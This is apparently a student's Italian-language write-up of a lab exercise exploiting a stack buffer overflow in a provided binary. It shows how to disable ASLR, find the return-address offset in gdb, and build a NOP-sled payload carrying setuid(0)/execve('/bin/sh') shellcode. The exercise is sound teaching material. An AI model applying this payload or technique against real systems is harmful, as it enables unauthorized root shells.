#11giugno2021 binary exploit

--//obbiettivo:
Compito dello studente Ã¨ sfruttare il buffer overflow 
in modo tale da eseguire lo shellcode fornito

--//preliminari:
1) da root disabilitare randomize:

	echo 0 > /proc/sys/kernel/randomize_va_space

2) se necessario dare permessi di esecuzione

	chmod +x ./bof

--//risoluzione:

1) dopo aver scoperto che l'eseguibile presenta un buffer
   che prende in input argv1, a tentativi cerco buffer overflow
   
   	(gdb) run $(perl -e 'print "A"x622,"BBBB"')
   	//le B mi permettono di controllare l'indirizzo di ritorno

2) usando python calcolo la lunghezza dello shellcode

	python
	>>> len(b'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68')
	//46

3) Nel PAYLOAD finale inserisco una serie di caratteri NOP (\x90);
   questi mi aiuteranno nell'esecuzione dello shellcode dopo il nuovo ritorno
   
   //calcolo dei NOP
   NOP = 626 (A+B) - 4 (B) - 46 (shellcode) = 576
   
4) cerco in modo approssimativo l'indirizzo di ritorno per eseguire lo shellcode
	
	(gdb) run $(perl -e 'print "A"x576,"B"x46,"CCCC"')
	(gdb) x/500xw $esp
	//scelgo un indirizzo prima delle B: 0xffffd230

5) PAYLOAD:
	(gdb) run $(perl -e 'print "\x90"x576,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68","\x30\xd2\xff\xff"')

 
